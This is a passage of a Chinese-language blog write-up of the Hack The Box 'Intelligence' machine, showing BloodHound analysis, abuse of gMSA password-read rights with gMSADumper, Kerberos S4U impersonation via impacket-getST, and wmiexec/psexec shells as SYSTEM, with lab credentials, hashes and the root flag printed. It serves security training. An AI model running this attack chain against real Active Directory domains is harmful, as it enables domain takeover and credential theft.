Connecting to LDAP server: dc.intelligence.htb<br>INFO: Found <span class="hljs-number">1</span> domains<br>INFO: Found <span class="hljs-number">1</span> domains in the forest<br>INFO: Found <span class="hljs-number">1</span> computers<br>INFO: Connecting to LDAP server: dc.intelligence.htb<br>INFO: Found <span class="hljs-number">43</span> users<br>INFO: Found <span class="hljs-number">55</span> groups<br>INFO: Found <span class="hljs-number">0</span> trusts<br>INFO: Starting computer enumeration with <span class="hljs-number">10</span> workers<br>INFO: Querying computer: dc.intelligence.htb<br>INFO: Done in <span class="hljs-number">00</span>M <span class="hljs-number">48</span>S<br></code></pre></td></tr></table></figure>

<p>21、下面启动下neo4j数据库，就开始上传分析吧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo neo4j start<br>[sudo] kali 的密码：<br>Directories in use:<br>home:         /usr/share/neo4j<br>config:       /usr/share/neo4j/conf<br>logs:         /etc/neo4j/logs<br>plugins:      /usr/share/neo4j/plugins<br>import:       /usr/share/neo4j/import<br>data:         /etc/neo4j/data<br>certificates: /usr/share/neo4j/certificates<br>licenses:     /usr/share/neo4j/licenses<br>run:          /var/lib/neo4j/run<br>Starting Neo4j.<br>Started <span class="hljs-title function_">neo4j</span> <span class="hljs-params">(pid:<span class="hljs-number">53161</span>)</span>. It is available at http:<span class="hljs-comment">//localhost:7474</span><br>There may be a <span class="hljs-type">short</span> delay until the server is ready.<br></code></pre></td></tr></table></figure>

<p><code>上传到分析平台上</code></p>
<p><img src="http://sh1yan.top/photo/Intelligence-htb-writeup/10.png" srcset="/img/loading.gif" lazyload></p>
<p><code>在 Bloodhound 中，将用户Tiffany.Molina和Ted.Graves标记为拥有，并将用户svc_int和管理员标记为高价值目标。</code></p>
<p><img src="http://sh1yan.top/photo/Intelligence-htb-writeup/11.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="http://sh1yan.top/photo/Intelligence-htb-writeup/12.png" srcset="/img/loading.gif" lazyload></p>
<p>22、开始研究整个的攻击路径</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">SVC_INT$@INTELLIGENCE.HTB is a Group Managed Service Account. The group ITSUPPORT@INTELLIGENCE.HTB can retrieve the password <span class="hljs-keyword">for</span> the GMSA SVC_INT$@INTELLIGENCE.HTB.<br><br>Group Managed Service Accounts are a special type of Active Directory object, where the password <span class="hljs-keyword">for</span> that object is mananaged by and automatically changed by Domain Controllers on a <span class="hljs-built_in">set</span> <span class="hljs-title function_">interval</span> <span class="hljs-params">(check the MSDS-ManagedPasswordInterval attribute)</span>.<br><br>The intended use of a GMSA is to allow certain computer accounts to retrieve the password <span class="hljs-keyword">for</span> the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA.<br><br>SVC_INT$@智能。HTB是一个集团管理服务帐户。该组ITSUPPORT@INTELLIGENCE.HTB可以检索GMSA SVC_INT$@INTELLIGENCE的密码。HTB。<br><br>组管理服务帐户是一种特殊类型的Active Directory对象，其中该对象的密码由域控制器管理，并由域控制器按设置的时间间隔自动更改（请检查MSDS ManagedPasswordInterval属性）。<br><br>GMSA的预期用途是允许某些计算机帐户检索GMSA的密码，然后作为GMSA运行本地服务。拥有授权主体控制权的攻击者可能会滥用该权限来模拟GMSA。<br><br>There are several ways to abuse the ability to read the GMSA password. The most straight forward abuse is possible when the GMSA is currently logged on to a computer, which is the intended behavior <span class="hljs-keyword">for</span> a GMSA. If the GMSA is logged on to the computer account which is granted the ability to retrieve the GMSA&#x27;s password, simply steal the token from the process running as the GMSA, or inject into that process.<br><br>If the GMSA is not logged onto the computer, you may create a scheduled task or service <span class="hljs-built_in">set</span> to run as the GMSA. The computer account will start the sheduled task or service as the GMSA, and then you may abuse the GMSA logon in the same fashion you would a standard user running processes on the <span class="hljs-title function_">machine</span> <span class="hljs-params">(see the <span class="hljs-string">&quot;HasSession&quot;</span> help modal <span class="hljs-keyword">for</span> more details)</span>.<br><br>Finally, it is possible to remotely retrieve the password <span class="hljs-keyword">for</span> the GMSA and convert that password to its equivalent NT hash.gMSADumper.py can be used <span class="hljs-keyword">for</span> that purpose.<br><br>gMSADumper.py -u &#x27;user&#x27; -p &#x27;password&#x27; -d &#x27;domain.local&#x27;<br>At this point you are ready to use the NT hash the same way you would with a regular user account. You can perform pass-the-hash, overpass-the-hash, or any other technique that takes an NT hash as an input.<br><br>有几种方法可以滥用读取GMSA密码的能力。当GMSA当前登录到计算机时，最直接的滥用是可能的，这是GMSA的预期行为。如果GMSA登录到被授予检索GMSA密码能力的计算机帐户，只需从作为GMSA运行的进程中窃取令牌，或注入该进程。<br><br>如果GMSA未登录到计算机上，则可以创建一个计划任务或服务集以作为GMSA运行。计算机帐户将作为GMSA启动计划的任务或服务，然后您可能会滥用GMSA登录，就像在计算机上运行进程的标准用户一样（有关更多详细信息，请参阅“HasSession”帮助模式）。<br><br>最后，可以远程检索GMSA的密码，并将该密码转换为等效的NT哈希。MSADumper.py可以用于此目的。<br><br>gMSADumper.py-u“用户”-p“密码”-d“域.local”<br>此时，您可以像使用普通用户帐户一样使用NT哈希了。您可以执行传递散列、跨越散列或任何其他将NT散列作为输入的技术。<br><br>When abusing a GMSA that is already logged onto a system, you will have the same opsec considerations as when abusing a standard user logon. For more information about that, see the &quot;HasSession&quot; modal&#x27;s opsec considerations tab.<br><br>When retrieving the GMSA password from Active Directory, you may generate a 4662 event on the Domain Controller; however, that event will likely perfectly resemble a legitimate event <span class="hljs-keyword">if</span> you request the password from the same context as a computer account that is already authorized to read the GMSA password.<br><br>当滥用已经登录到系统上的GMSA时，您将与滥用标准用户登录时有相同的opsec注意事项。有关这方面的更多信息，请参阅“HasSession”模态的opsec注意事项选项卡。<br><br>从Active Directory检索GMSA密码时，您可以在域控制器上生成<span class="hljs-number">4662</span>事件；但是，如果您从与已被授权读取GMSA密码的计算机帐户相同的上下文中请求密码，则该事件很可能与合法事件完全相似。<br><br>https:<span class="hljs-comment">//github.com/micahvandeusen/gMSADumper</span><br></code></pre></td></tr></table></figure>

<p>23、也就是说，这里可以滥用读取GMSA密码的，这里先使用这个工具进行获取下密码哈希吧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop/gMSADumper]<br>└─$ python3 gMSADumper.py -u <span class="hljs-string">&#x27;TED.GRAVES&#x27;</span> -p <span class="hljs-string">&#x27;Mr.Teddy&#x27;</span> -d <span class="hljs-string">&#x27;intelligence.htb&#x27;</span><br>Users or groups who can read password <span class="hljs-keyword">for</span> svc_int$:<br> &gt; DC$<br> &gt; itsupport<br>svc_int$:::<span class="hljs-number">486b</span>1ed2229329984333a964b71045e9<br>svc_int$:aes256-cts-hmac-sha1<span class="hljs-number">-96</span>:<span class="hljs-number">0</span>d542d3dac3287785fe6d87d4e242bfcbcd3bf999541f31cd1b058e42ed2992a<br>svc_int$:aes128-cts-hmac-sha1<span class="hljs-number">-96</span>:e85b1861ce4c561627b9532b64d86460<br></code></pre></td></tr></table></figure>

<p>24、接下来使用该服务账号构造一个票据进行登录服务器，下面先把时间与域控时间同步，这样好构造票据，要与目标主机同步时间，我们需要首先通过运行命令来停用自动时间同步timedatectl set-ntp 0。之后，我们可以执行 sudo ntpdate -s intelligence.htb来启动同步过程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop/gMSADumper]<br>└─$ sudo timedatectl <span class="hljs-built_in">set</span>-ntp <span class="hljs-number">0</span><br><br>┌──(kali㉿offsec)-[~/Desktop/gMSADumper]<br>└─$ date &amp;&amp; sudo ntpdate -s intelligence.htb &amp;&amp; date<br><span class="hljs-number">2024</span>年 <span class="hljs-number">04</span>月 <span class="hljs-number">01</span>日 星期一 <span class="hljs-number">23</span>:<span class="hljs-number">23</span>:<span class="hljs-number">59</span> CST<br><span class="hljs-number">2024</span>年 <span class="hljs-number">04</span>月 <span class="hljs-number">02</span>日 星期二 <span class="hljs-number">06</span>:<span class="hljs-number">23</span>:<span class="hljs-number">59</span> CST<br></code></pre></td></tr></table></figure>

<p>25、生成票据文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop/gMSADumper]<br>└─$ impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :<span class="hljs-number">486b</span>1ed2229329984333a964b71045e9<br>Impacket v0<span class="hljs-number">.11</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2023</span> Fortra<br><br>[-] CCache file is not found. Skipping...<br>[*] Getting TGT <span class="hljs-keyword">for</span> user<br>[*] Impersonating Administrator<br>[*]     Requesting S4U2self<br>[*]     Requesting S4U2Proxy<br>[*] Saving ticket in Administrator.ccache<br><br>┌──(kali㉿offsec)-[~/Desktop/gMSADumper]<br>└─$ ls             <br>Administrator.ccache  COPYING  gMSADumper.py  __init__.py  README.md  requirements.txt<br></code></pre></td></tr></table></figure>

<p>26、为了获得 shell，我将使用wmiexec（Impacket 附带的）。-k将指定 Kerberos 身份验证。我将设置KRB5CCNAME环境变量以指向我要使用的票证文件。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop/gMSADumper]<br>└─$ KRB5CCNAME=Administrator.ccache impacket-wmiexec -k -no-pass administrator@dc.intelligence.htb<br>Impacket v0<span class="hljs-number">.11</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2023</span> Fortra<br><br>[*] SMBv3<span class="hljs-number">.0</span> dialect used<br>[!] Launching semi-interactive shell - Careful what you execute<br>[!] Press help <span class="hljs-keyword">for</span> extra shell commands<br>C:\&gt;whoami<br>intelligence\administrator<br></code></pre></td></tr></table></figure>

<p>27、可以看到是管理员账号，那我们继续使用 impacket-psexec 这个工具来生成system的权限，来读取flag吧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop/gMSADumper]<br>└─$ KRB5CCNAME=Administrator.ccache  impacket-psexec -dc-ip dc.intelligence.htb -k <span class="hljs-string">&quot;intelligence.htb/Administrator@dc.intelligence.htb&quot;</span> -no-pass<br>Impacket v0<span class="hljs-number">.11</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2023</span> Fortra<br><br>[*] Requesting shares on dc.intelligence.htb.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file SOMzpjgG.exe<br>[*] Opening SVCManager on dc.intelligence.htb.....<br>[*] Creating service ancH on dc.intelligence.htb.....<br>[*] Starting service ancH.....<br>[!] Press help <span class="hljs-keyword">for</span> extra shell commands<br>Microsoft Windows [Version <span class="hljs-number">10.0</span><span class="hljs-number">.17763</span><span class="hljs-number">.1879</span>]<br>(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.<br><br>C:\Windows\system32&gt; whoami<br>nt authority\system<br><br>C:\Windows\system32&gt; cd C:/Users/Administrator/Desktop<br> <br>C:\Users\Administrator\Desktop&gt; type root.txt<br><span class="hljs-number">44f</span>316f48f6250723dfd91afb7dcfabb<br><br>C:\Users\Administrator\Desktop&gt; <br></code></pre></td></tr></table></figure>


<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/357</code></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Intelligence-htb-writeup</div>
      <div>https://sh1yan.top/2024/03/31/Intelligence-htb-writeup/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>shiyan</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年3月31日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/04/07/Scrambled-htb-writeup/" title="Scrambled-htb-writeup">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Scrambled-htb-writeup</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/03/30/Worker-htb-writeup/" title="Worker-htb-writeup">
                        <span class="hidden-mobile">Worker-htb-writeup</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
